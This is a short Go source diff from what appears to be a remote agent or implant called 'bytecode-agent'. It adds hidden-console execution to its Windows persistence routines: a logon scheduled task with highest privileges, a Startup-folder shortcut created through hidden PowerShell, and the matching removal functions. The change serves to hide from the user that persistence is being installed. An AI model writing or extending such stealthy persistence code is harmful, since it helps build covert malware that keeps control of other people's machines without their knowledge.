@@ -8,6 +8,8 @@ import (
 	"path/filepath"
 	"syscall"
 	"unsafe"
+
+	"bytecode-agent/internal/windows"
 )
 
 func addPersistence(payload interface{}) (string, error) {
@@ -106,6 +108,7 @@ func removeRegistryPersistence() (string, error) {
 func persistScheduledTask(exePath string) (string, error) {
 	cmd := exec.Command("schtasks", "/create", "/tn", "ByteCodeService",
 		"/tr", exePath, "/sc", "onlogon", "/rl", "highest", "/f")
+	windows.HideConsole(cmd)
 	out, err := cmd.CombinedOutput()
 	if err != nil {
 		return "", fmt.Errorf("schtasks failed: %s", string(out))
@@ -115,6 +118,7 @@ func persistScheduledTask(exePath string) (string, error) {
 
 func removeScheduledTaskPersistence() (string, error) {
 	cmd := exec.Command("schtasks", "/delete", "/tn", "ByteCodeService", "/f")
+	windows.HideConsole(cmd)
 	out, err := cmd.CombinedOutput()
 	if err != nil {
 		return "", fmt.Errorf("failed: %s", string(out))
@@ -129,6 +133,7 @@ func persistStartupFolder(exePath string) (string, error) {
 
 	psCmd := fmt.Sprintf(`$s=(New-Object -ComObject WScript.Shell).CreateShortcut('%s');$s.TargetPath='%s';$s.Save()`, linkName, exePath)
 	cmd := exec.Command("powershell", "-WindowStyle", "Hidden", "-Command", psCmd)
+	windows.HideConsole(cmd)
 	out, err := cmd.CombinedOutput()
 	if err != nil {
 		return "", fmt.Errorf("failed: %s %v", string(out), err)
